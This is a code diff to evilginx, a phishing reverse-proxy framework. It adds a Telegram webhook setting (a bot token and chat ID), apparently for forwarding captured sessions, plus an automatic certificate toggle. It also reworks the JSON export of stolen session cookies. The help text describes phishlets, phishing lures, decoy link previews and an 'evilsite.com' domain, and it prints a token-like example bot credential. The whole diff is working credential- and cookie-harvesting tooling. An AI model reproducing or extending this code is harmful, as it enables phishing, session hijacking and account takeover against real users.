@@ -182,8 +182,13 @@ func (t *Terminal) DoWork() {
 func (t *Terminal) handleConfig(args []string) error {
 	pn := len(args)
 	if pn == 0 {
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl}
+		autocertOnOff := "off"
+		if t.cfg.IsAutocertEnabled() {
+			autocertOnOff = "on"
+		}
+
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "webhook_telegram"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.general.WebhookTelegram}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -205,6 +210,22 @@ func (t *Terminal) handleConfig(args []string) error {
 			}
 			t.cfg.SetUnauthUrl(args[1])
 			return nil
+		case "webhook_telegram":
+			t.cfg.SetWebhookTelegram(args[1])
+			log.Warning("you need to restart evilginx after this change")
+			return nil
+
+		case "autocert":
+			switch args[1] {
+			case "on":
+				t.cfg.EnableAutocert(true)
+				t.manageCertificates(true)
+				return nil
+			case "off":
+				t.cfg.EnableAutocert(false)
+				t.manageCertificates(true)
+				return nil
+			}
 		}
 	} else if pn == 3 {
 		switch args[0] {
@@ -383,7 +404,7 @@ func (t *Terminal) handleSessions(args []string) error {
 		s_found := false
 		for _, s := range sessions {
 			if s.Id == id {
-				pl, err := t.cfg.GetPhishlet(s.Phishlet)
+				_, err := t.cfg.GetPhishlet(s.Phishlet)
 				if err != nil {
 					log.Error("%v", err)
 					break
@@ -430,7 +451,7 @@ func (t *Terminal) handleSessions(args []string) error {
 						log.Printf("[ %s ]\n%s\n", lgreen.Sprint("tokens"), AsRows(tkeys, tvals))
 					}
 					if len(s.CookieTokens) > 0 {
-						json_tokens := t.cookieTokensToJSON(pl, s.CookieTokens)
+						json_tokens := t.cookieTokensToJSON(s.CookieTokens)
 						log.Printf("[ %s ]\n%s\n\n", lyellow.Sprint("cookies"), json_tokens)
 					}
 				}
@@ -1109,13 +1130,15 @@ func (t *Terminal) monitorLurePause() {
 func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
-		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("wildcards")))
+		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off"))))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
 	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
 	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
 	h.AddSubCommand("config", []string{"ipv4", "external"}, "ipv4 external <ipv4_address>", "set ipv4 external address of the current server")
+	h.AddSubCommand("config", []string{"webhook_telegram"}, "webhook_telegram <bot_token>/<chat_id>", "(example: 4101656209:AAFJeahG73axTthuvh4wW4gg6Wtnhe51yVw/1721242916)")
 	h.AddSubCommand("config", []string{"ipv4", "bind"}, "ipv4 bind <ipv4_address>", "set ipv4 bind address of the current server")
 	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "change the url where all unauthorized requests will be redirected to")
+	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "enable or disable the automated certificate retrieval from letsencrypt")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
@@ -1155,7 +1178,7 @@ func (t *Terminal) createHelp() {
 
 	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
 		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
-			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("params"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)))),
+			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("params"), readline.PcItem("ua_filter"),  readline.PcItem("webhook_telegram"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)))),
 			readline.PcItem("delete", readline.PcItem("all"))))
 
 	h.AddSubCommand("lures", nil, "", "show all create lures")
@@ -1198,7 +1221,7 @@ func (t *Terminal) createHelp() {
 	t.hlp = h
 }
 
-func (t *Terminal) cookieTokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.CookieToken) string {
+func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.CookieToken) string {
 	type Cookie struct {
 		Path           string `json:"path"`
 		Domain         string `json:"domain"`
@@ -1242,7 +1265,7 @@ func (t *Terminal) cookieTokensToJSON(pl *Phishlet, tokens map[string]map[string
 	return string(json)
 }
 
-func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]string) string {
+func (t *Terminal) tokensToJSON(tokens map[string]string) string {
 	var ret string
 	white := color.New(color.FgHiWhite)
 	for k, v := range tokens {
@@ -1262,21 +1285,30 @@ func (t *Terminal) checkStatus() {
 
 func (t *Terminal) manageCertificates(verbose bool) {
 	if !t.p.developer {
-		hosts := t.p.cfg.GetActiveHostnames("")
-		//wc_host := t.p.cfg.GetWildcardHostname()
-		//hosts := []string{wc_host}
-		//hosts = append(hosts, t.p.cfg.GetActiveHostnames("")...)
-		if verbose {
-			log.Info("obtaining and setting up %d TLS certificates - please wait up to 60 seconds...", len(hosts))
-		}
-		err := t.p.crt_db.setManagedSync(hosts, 60*time.Second)
-		if err != nil {
-			log.Error("failed to set up TLS certificates: %s", err)
-			log.Error("run 'test-certs' command to retry")
-			return
-		}
-		if verbose {
-			log.Info("successfully set up all TLS certificates")
+		if t.cfg.IsAutocertEnabled() {
+			hosts := t.p.cfg.GetActiveHostnames("")
+			//wc_host := t.p.cfg.GetWildcardHostname()
+			//hosts := []string{wc_host}
+			//hosts = append(hosts, t.p.cfg.GetActiveHostnames("")...)
+			if verbose {
+				log.Info("obtaining and setting up %d TLS certificates - please wait up to 60 seconds...", len(hosts))
+			}
+			err := t.p.crt_db.setManagedSync(hosts, 60*time.Second)
+			if err != nil {
+				log.Error("failed to set up TLS certificates: %s", err)
+				log.Error("run 'test-certs' command to retry")
+				return
+			}
+			if verbose {
+				log.Info("successfully set up all TLS certificates")
+			}
+		} else {
+			err := t.p.crt_db.setUnmanagedSync(verbose)
+			if err != nil {
+				log.Error("failed to set up TLS certificates: %s", err)
+				log.Error("run 'test-certs' command to retry")
+				return
+			}
 		}
 	}
 }
